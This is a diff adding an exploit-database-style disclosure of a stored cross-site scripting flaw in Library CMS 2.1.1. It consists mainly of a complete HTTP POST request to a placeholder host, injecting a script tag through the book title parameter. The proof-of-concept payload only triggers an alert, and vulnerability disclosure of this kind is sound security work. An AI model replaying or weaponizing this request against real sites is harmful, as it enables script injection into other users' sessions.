@@ -1,0 +1,30 @@
+# Exploit Title: Library CMS 2.1.1 - Cross-Site Scripting
+# Date: 2018-10-15
+# Exploit Author: Ismail Tasdelen
+# Vendor Homepage: https://kaasoft.pro/
+# Software Link : https://library.kaasoft.pro/
+# Software : Library CMS - Powerful Book Management System
+# Version : v 2.1.1
+# Vulernability Type : Cross-site Scripting
+# Vulenrability : Stored XSS
+# CVE : N/A
+
+# A Stored XSS vulnerability has been discovered in KAASoft 
+# Library CMS - Powerful Book Management System 2.1.1 via the /admin/book/create/ title parameter.
+ 
+# HTTP POST Request :
+ 
+POST /admin/book/create/ HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://TARGET/admin/book/create/
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 332
+Cookie: activeLanguage=en_US; activeLanguage=en_US; _ym_uid=1539576611293792951; _ym_d=1539576611; _ym_visorc_46947615=w; _ym_isad=2; PHPSESSID=3d6jd6k6snvc2vckn15sed2k15; activeLanguage=en_US
+Connection: close
+
+%D0%9A%D1%83%D0%BF%D0%B8%D1%82%D1%8C=&title=%22%3E%3Cscript%3Ealert(%22Ismail+Tasdelen%22)%3C%2Fscript%3E&rating=&subtitle=&url=&ISBN10=&ISBN13=&edition=&publishingYear=&pages=&type=Digital&physicalForm=Book&size=Huge&binding=Hardcover&price=&language=&description=&notes=&coverId=&eBookId=&metaTitle=&metaKeywords=&metaDescription=
